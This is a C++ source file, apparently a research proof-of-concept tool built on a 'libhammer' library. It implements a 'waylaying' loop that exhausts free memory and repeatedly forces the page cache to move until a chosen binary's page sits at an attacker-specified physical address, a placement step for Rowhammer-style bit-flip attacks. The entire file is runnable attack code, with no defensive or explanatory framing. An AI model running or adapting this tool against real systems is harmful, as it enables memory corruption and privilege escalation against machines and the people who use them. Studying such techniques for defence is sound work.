#include "libhammer.h"

using namespace std;

uint64_t current_pa, target_pa, step = 0;
vector<Page> pool;

int main(int argc, char **argv)
{
    if (argc < 2)
    {
        cout << "usage: waylaying [path] [addr]" << endl;
        cout << "       addr should be page-aligned" << endl;
        return 0;
    }

    string fname(argv[1]);
    uint64_t mem_size, avail_size, pool_mb, tmp = 0;
    stringstream ss;

    ss << hex << argv[2]; ss >> target_pa;
    //cout << "CHILD_MAX = " << sysconf(_SC_CHILD_MAX) << endl;
    current_pa = get_binary_pa(fname);
    cout << "path: " << fname << ", pa=" << hex << current_pa << " target pa=" << target_pa << endl;

    cout << "+ preparing..." << endl;
    mem_size = get_mem_size(); avail_size = get_meminfo("CommitLimit") - get_meminfo("Committed_AS");
    pool_mb = avail_size / 1024000 - 100;
    cout << dec << "- Memory size: " << dec << (mem_size / 1024000) << " MB, Available size: "
                 << (avail_size / 1024000) << " MB, " << endl
                 << "- Free size: " << (get_meminfo("MemFree") / 1024000) << "MB, Cached: " << (get_meminfo("Cached") / 1024000) << " MB." << endl
                 << "- Commit Limit: " << (get_meminfo("CommitLimit") / 1024000) << "MB, Commit AS: " << (get_meminfo("Committed_AS") / 1024000) << " MB." << endl;

    cout << "- Hold up " << dec << pool_mb << " MB to shrink waylaying space." << endl;
    pool = allocate_mb(pool_mb);

    //pause();
    for (auto p : pool)
            p.get<volatile uint64_t>(0) = p.v.get();
    cout << "+ start waylaying loop..." << endl;
    while (current_pa != target_pa)
    {
        ++step;
        cout <<"---------------- access pool" << endl;
        // access held memory
        for (auto p : pool)
            if (p.v.get() > 0)
                tmp += p.get<volatile uint64_t>(0);
        cout <<"---------------- access ok" << endl;
        do_waylaying();
        current_pa = get_binary_pa(fname);
        cout << "+ step " << dec << step << ": " << hex << current_pa << endl;
        usleep(500);
    }

    return 0;
}
